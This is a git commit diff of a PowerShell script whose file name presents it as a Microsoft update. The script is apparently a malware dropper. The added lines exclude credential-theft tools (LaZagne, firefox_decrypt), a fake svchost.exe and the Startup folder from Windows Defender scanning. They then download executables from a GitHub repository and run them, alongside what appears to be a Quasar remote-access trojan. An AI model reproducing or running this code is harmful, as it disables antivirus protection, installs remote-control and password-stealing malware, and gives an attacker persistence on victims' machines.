9e022583bda6275a3bb23bd69dc7cdc9605435a6
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-07-10 08:09:57 -0700

    Update microsoftupdatequasar.ps1

--- microsoftupdatequasar.ps1
+++ microsoftupdatequasar.ps1
@@ -1,4 +1,12 @@
-Add-MpPreference -ExclusionPrcoess "NRATnew.exe"
+Add-MpPreference -ExclusionProcess "windows10-wifi.exe"
+Add-MpPreference -ExclusionProcess "local.exe"
+Add-MpPreference -ExclusionProcess "firefox_decrypt.exe"
+Add-MpPreference -ExclusionProcess "lazagne.exe"
+Add-MpPreference -ExclusionProcess "svchost.exe"
+Add-MpPreference -ExclusionProcess "MicrosoftAutoUpdate.exe"
+Add-MpPreference -ExclusionProcess "NRATnew.exe"
+Add-MpPreference -ExclusionProcess "PersShell.exe"
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 Add-MpPreference -ExlcusionPath "C:\ProgramData\zDATAxD"
 mkdir C:\ProgramData\zDATAxD
 cd C:\programdata\zdataxd
@@ -8,3 +16,7 @@ $source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asr
 $destination = 'C:\ProgramData\zDATAxD\quasar\NRATnew.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
 start C:\programdata\zdataxd\quasar\NRATnew.exe
+$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/KJVERtttygFj3e4erjfi3j4g3495g4/main/svchost.exe'
+$destination = 'C:\ProgramData\zDATAxD\quasar\svchost.exe'
+Invoke-WebRequest -Uri $source -OutFile $destination
+start C:\programdata\zdataxd\quasar\svchost.exe
